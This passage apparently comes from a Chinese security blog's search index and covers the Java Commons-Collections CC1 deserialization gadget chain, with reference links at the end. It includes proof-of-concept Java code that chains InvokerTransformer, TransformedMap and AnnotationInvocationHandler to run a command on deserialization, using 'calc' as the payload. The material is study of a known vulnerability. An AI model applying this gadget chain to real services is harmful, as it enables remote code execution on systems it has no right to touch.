class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp03</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-string">&quot;bb&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-comment">// 发现是AnnotationInvocationHandler类中调用了readObejct方法，</span><br>        <span class="hljs-comment">// readObject方法中会使用到setValue方法</span><br>        <span class="hljs-comment">// 但是AnnotationInvocationHandler这个类不是public的</span><br>        <span class="hljs-comment">// 1.使用反射去获取这个类</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aClassDeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        aClassDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 创建对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aObejct</span> <span class="hljs-operator">=</span> aClassDeclaredConstructor.newInstance(Override.class, transformedMap);<br>        <span class="hljs-comment">// 执行反序列化</span><br>        serialize(aObejct);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.writeObject(o);<br>        stream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.readObject();<br>        stream.close();<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="4-疑惑："><a href="#4-疑惑：" class="headerlink" title="4. 疑惑："></a>4. 疑惑：</h1><h2 id="4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？"><a href="#4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？" class="headerlink" title="4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？"></a>4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？</h2><p>开始我们知道使用chainedTransformer中的<code>transfomer</code>方法可以方便我们去调用，我们传入多个对象就会不断循环去调用这些对象的<code>transfomer</code>方法。</p><p>如图：</p><p><img src="/./../blog_image/image-20231026174119500.png" alt="image-20231026174119500"></p><p>我们只要将我们需要传入的<code>Runtime.class</code>就可以实现我们的链路了。</p><p><img src="/./../blog_image/image-20231026174331664.png" alt="image-20231026174331664"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li>视频：<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></li><li>博客：<ul><li><a href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1 - h0cksr - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/weixin_45808483/article/details/122743960">【精选】Java安全入门(二)——CC链1 分析+详解_cc1利用链_ErYao7的博客-CSDN博客</a></li><li><a href="https://xz.aliyun.com/t/12669">JAVA安全初探(三):CC1链全分析 - 先知社区 (aliyun.com)</a></li><li><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链 | Drunkbaby’s Blog (drun1baby.top)</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
